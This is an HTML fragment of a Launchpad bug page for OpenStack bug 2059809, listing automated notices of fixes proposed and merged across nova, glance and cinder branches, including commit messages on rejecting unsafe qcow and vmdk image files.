        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-09-12T12:28:59.718973+00:00" title="2024-09-12 12:28:59 UTC">on 2024-09-12</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/438"> #438</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/925594">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/925594</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/nova/commit/76c43c4c56221cb836cf07b2df749cd94ec276e1">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />nova/commit/<wbr />76c43c4c56221cb<wbr />836cf07b2df749c<wbr />d94ec276e1</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    unmaintained/yoga</p>
<p>commit 76c43c4c56221cb<wbr />836cf07b2df749c<wbr />d94ec276e1<br />
Author: Balazs Gibizer &lt;email address hidden&gt;<br />
Date:   Thu Jul 11 07:29:40 2024 +0200</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Stabilize iso format unit tests</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Some version of mkisofs does not properly handle if both the input and<br />
&nbsp;&nbsp;&nbsp;&nbsp;the output file of the command are the same. So this commit changes the<br />
&nbsp;&nbsp;&nbsp;&nbsp;unit tests depending on that binary to use a different files.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Related-Bug: #2059809<br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I6924eb23ff5804<wbr />c22a48ec6fabcec<wbr />25f061906bb<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit c6d8c6972d52845<wbr />774b36acb84cd08<wbr />a4b2e4dcde)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit a8783a767551df3<wbr />dd943bd862cdba3<wbr />5c51cdb7a6)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 02147b36d35e1e4<wbr />62e1405c36a2e67<wbr />a33de806de)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 47428f6caf503b9<wbr />4583dac614b5997<wbr />1f60a0ba9c)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 11613e7b3244958<wbr />fa8d0b5253a1852<wbr />87d1ade2d8)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/nova/+/925594
Committed: https://opendev.org/openstack/nova/commit/76c43c4c56221cb836cf07b2df749cd94ec276e1
Submitter: "Zuul (22348)"
Branch:    unmaintained/yoga

commit 76c43c4c56221cb836cf07b2df749cd94ec276e1
Author: Balazs Gibizer &lt;gibi@redhat.com&gt;
Date:   Thu Jul 11 07:29:40 2024 +0200

    Stabilize iso format unit tests
    
    Some version of mkisofs does not properly handle if both the input and
    the output file of the command are the same. So this commit changes the
    unit tests depending on that binary to use a different files.
    
    Related-Bug: #2059809
    Change-Id: I6924eb23ff5804c22a48ec6fabcec25f061906bb
    (cherry picked from commit c6d8c6972d52845774b36acb84cd08a4b2e4dcde)
    (cherry picked from commit a8783a767551df3dd943bd862cdba35c51cdb7a6)
    (cherry picked from commit 02147b36d35e1e462e1405c36a2e67a33de806de)
    (cherry picked from commit 47428f6caf503b94583dac614b59971f60a0ba9c)
    (cherry picked from commit 11613e7b3244958fa8d0b5253a185287d1ade2d8)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/439" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-09-12T12:30:06.434769+00:00" title="2024-09-12 12:30:06 UTC">on 2024-09-12</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/439">
                <strong>Fix merged to glance (unmaintained/zed)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/439"> #439</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/glance/+/923307">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/glance/<wbr />+/923307</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/glance/commit/63ac35e3248ceed3176a65cdccbbf06f69b3c58e">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />glance/<wbr />commit/<wbr />63ac35e3248ceed<wbr />3176a65cdccbbf0<wbr />6f69b3c58e</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    unmaintained/zed</p>
<p>commit 63ac35e3248ceed<wbr />3176a65cdccbbf0<wbr />6f69b3c58e<br />
Author: Dan Smith &lt;email address hidden&gt;<br />
Date:   Tue Apr 16 11:20:48 2024 -0700</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Reject unsafe qcow and vmdk files</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This causes us to use the format inspector to pre-examine qcow and<br />
&nbsp;&nbsp;&nbsp;&nbsp;vmdk files for safe configurations before even using qemu-img<br />
&nbsp;&nbsp;&nbsp;&nbsp;on them.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Depends-On: <a rel="nofollow" href="https://review.opendev.org/c/openstack/glance/+/923861">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/glance/<wbr />+/923861</a><br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I0554706368e573<wbr />e11f649c09569f7<wbr />c21cbc8634b<br />
&nbsp;&nbsp;&nbsp;&nbsp;Closes-Bug: #2059809<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit a95f335bca1dfdd<wbr />1c904ae475e9fe8<wbr />c6806f2c56)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 55fc42563818fcf<wbr />88b474233df242a<wbr />796c918b3a)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit f1f53075d69a9a1<wbr />c006b3e25506e30<wbr />eb0210de1f)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit c1c54abeaba91ae<wbr />0030d4acf01a913<wbr />39b60a2d7d)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/glance/+/923307
Committed: https://opendev.org/openstack/glance/commit/63ac35e3248ceed3176a65cdccbbf06f69b3c58e
Submitter: "Zuul (22348)"
Branch:    unmaintained/zed

commit 63ac35e3248ceed3176a65cdccbbf06f69b3c58e
Author: Dan Smith &lt;dansmith@redhat.com&gt;
Date:   Tue Apr 16 11:20:48 2024 -0700

    Reject unsafe qcow and vmdk files
    
    This causes us to use the format inspector to pre-examine qcow and
    vmdk files for safe configurations before even using qemu-img
    on them.
    
    Depends-On: https://review.opendev.org/c/openstack/glance/+/923861
    Change-Id: I0554706368e573e11f649c09569f7c21cbc8634b
    Closes-Bug: #2059809
    (cherry picked from commit a95f335bca1dfdd1c904ae475e9fe8c6806f2c56)
    (cherry picked from commit 55fc42563818fcf88b474233df242a796c918b3a)
    (cherry picked from commit f1f53075d69a9a1c006b3e25506e30eb0210de1f)
    (cherry picked from commit c1c54abeaba91ae0030d4acf01a91339b60a2d7d)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/440" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-09-16T12:28:49.758206+00:00" title="2024-09-16 12:28:49 UTC">on 2024-09-16</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/440">
                <strong>Fix included in openstack/cinder 25.0.0.0rc1</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/440"> #440</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This issue was fixed in the openstack/cinder 25.0.0.0rc1  release candidate.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This issue was fixed in the openstack/cinder 25.0.0.0rc1  release candidate.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/441" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-09-17T15:47:32.035037+00:00" title="2024-09-17 15:47:32 UTC">on 2024-09-17</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/441">
                <strong>Fix proposed to glance (unmaintained/yoga)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/441"> #441</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: unmaintained/yoga<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/glance/+/929666">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/glance/<wbr />+/929666</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: unmaintained/yoga
Review: https://review.opendev.org/c/openstack/glance/+/929666</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/442" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-09-17T15:47:40.900632+00:00" title="2024-09-17 15:47:40 UTC">on 2024-09-17</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/442">
                <strong>Fix proposed to nova (unmaintained/xena)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/442"> #442</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: unmaintained/xena<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/929667">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/929667</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: unmaintained/xena
Review: https://review.opendev.org/c/openstack/nova/+/929667</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/443" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-09-17T15:47:49.000160+00:00" title="2024-09-17 15:47:49 UTC">on 2024-09-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/443"> #443</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: unmaintained/xena<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/929668">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/929668</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: unmaintained/xena
Review: https://review.opendev.org/c/openstack/nova/+/929668</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/444" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-09-17T15:48:08.023634+00:00" title="2024-09-17 15:48:08 UTC">on 2024-09-17</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/444">
                <strong>Related fix proposed to nova (unmaintained/xena)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/444"> #444</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Related fix proposed to branch: unmaintained/xena<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/929671">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/929671</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Related fix proposed to branch: unmaintained/xena
Review: https://review.opendev.org/c/openstack/nova/+/929671</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/445" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-09-17T15:48:25.243246+00:00" title="2024-09-17 15:48:25 UTC">on 2024-09-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/445"> #445</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Related fix proposed to branch: unmaintained/xena<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/929674">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/929674</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Related fix proposed to branch: unmaintained/xena
Review: https://review.opendev.org/c/openstack/nova/+/929674</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/446" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-09-17T15:48:37.084200+00:00" title="2024-09-17 15:48:37 UTC">on 2024-09-17</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/446"> #446</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Related fix proposed to branch: unmaintained/xena<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/929676">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/929676</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Related fix proposed to branch: unmaintained/xena
Review: https://review.opendev.org/c/openstack/nova/+/929676</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/447" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-09-20T08:14:47.360191+00:00" title="2024-09-20 08:14:47 UTC">on 2024-09-20</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/447">
                <strong>Fix included in openstack/nova 30.0.0.0rc1</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/447"> #447</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This issue was fixed in the openstack/nova 30.0.0.0rc1  release candidate.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This issue was fixed in the openstack/nova 30.0.0.0rc1  release candidate.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          

          
              <div>
  <div id="comments-container"></div>
  <div class="boardComment comments-hidden-message" style="border-bottom: 0">
    <div class="boardCommentDetails">
      <table>
        <tbody>
          <tr>
            <td>
              <span class="sprite arrowRight"></span>
              1 comments hidden
              <span id="more-comments-spinner" class="hidden">
                Loading more comments
                <img src="/@@/spinner" />
              </span>
            </td>

            <td class="bug-comment-index">
              <a href="?comments=all" id="show-comments-link" class="show-comments-link sprite retry" style="white-space: nowrap">
                 view all 455 comments</a>
            </td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>
</div>
          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/449" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-10-07T10:51:27.797260+00:00" title="2024-10-07 10:51:27 UTC">on 2024-10-07</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/449">
                <strong>Fix proposed to glance (unmaintained/yoga)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/449"> #449</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: unmaintained/yoga<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/glance/+/931639">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/glance/<wbr />+/931639</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: unmaintained/yoga
Review: https://review.opendev.org/c/openstack/glance/+/931639</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/450" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-10-07T10:53:07.031573+00:00" title="2024-10-07 10:53:07 UTC">on 2024-10-07</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2059809/comments/450">
                <strong>Related fix proposed to glance (unmaintained/yoga)</strong>
              </a>
          </td>
          

          <td>
            
